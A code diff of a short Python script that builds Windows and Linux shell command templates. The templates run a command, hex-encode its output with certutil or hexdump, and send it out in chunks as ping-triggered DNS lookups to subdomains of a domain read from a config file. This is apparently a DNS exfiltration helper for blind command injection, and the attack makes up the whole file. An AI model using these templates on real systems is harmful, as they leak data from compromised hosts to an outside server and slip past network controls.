@@ -1,9 +1,8 @@
 import sys
-#author: 617sec //https://github.com/Dr-S1x17
 
 commandTemWin = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0}'
 
-commandTemLinux = r'rm command7;rm command7.txt;command > command7 &&echo 11111111111>>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'
+commandTemLinux = r'rm -f command7;rm -f command7.txt;command > command7 &&echo 11111111111 >>command7 && cat command7|hexdump -C > command7.txt && cat command7.txt |sed s/[[:space:]]//g | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.command.{0}; done'
 with open('config617', 'r') as f:
     domain = f.readlines()[0]
     commandWin = commandTemWin.format(domain)
